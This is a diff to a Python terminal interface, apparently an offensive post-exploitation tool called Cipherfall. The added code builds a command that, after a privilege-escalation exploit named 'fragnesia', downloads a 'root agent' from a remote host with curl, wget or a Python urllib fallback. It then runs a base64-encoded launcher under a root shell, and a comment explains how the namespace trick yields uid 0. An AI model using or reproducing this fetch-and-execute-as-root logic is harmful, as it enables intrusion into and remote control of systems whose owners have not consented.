@@ -1263,14 +1263,25 @@ class CipherfallTUI(App):
                 f"os.execv('/usr/bin/python3',['/usr/bin/python3','{ra}'])\n"
             )
             _launch_b64 = base64.b64encode(_launch_src.encode()).decode()
-            spawn_cmd = (
-                f"{shell_root} -c '"
-                f"PATH=/usr/bin:/bin:/usr/sbin:/sbin:$PATH; "
-                f"curl -sfo {ra} http://{host}/{served_name} "
-                f"|| wget -qO {ra} http://{host}/{served_name}; "
-                f"printf %s {_launch_b64}|base64 -d|python3 & echo ok'; "
-                f"echo '[rootagent:spawned]'"
-            )
+            _dl_url = f"http://{host}/{served_name}"
+            _py_dl  = f"python3 -c \"import urllib.request; urllib.request.urlretrieve('{_dl_url}','{ra}')\""
+            if exploit == "fragnesia":
+                # Download outside namespace (network exists there);
+                # exec launcher inside namespace (uid=0 inside namespace only).
+                spawn_cmd = (
+                    f"PATH=/usr/bin:/bin:/usr/sbin:/sbin:$PATH; "
+                    f"curl -sfo {ra} {_dl_url} || wget -qO {ra} {_dl_url} || {_py_dl}; "
+                    f"{shell_root} -c 'printf %s {_launch_b64}|base64 -d|python3 & echo ok'; "
+                    f"echo '[rootagent:spawned]'"
+                )
+            else:
+                spawn_cmd = (
+                    f"{shell_root} -c '"
+                    f"PATH=/usr/bin:/bin:/usr/sbin:/sbin:$PATH; "
+                    f"curl -sfo {ra} {_dl_url} || wget -qO {ra} {_dl_url}; "
+                    f"printf %s {_launch_b64}|base64 -d|python3 & echo ok'; "
+                    f"echo '[rootagent:spawned]'"
+                )
         else:
             agent_b64 = base64.b64encode(agent_text.encode()).decode()
             spawn_cmd = (
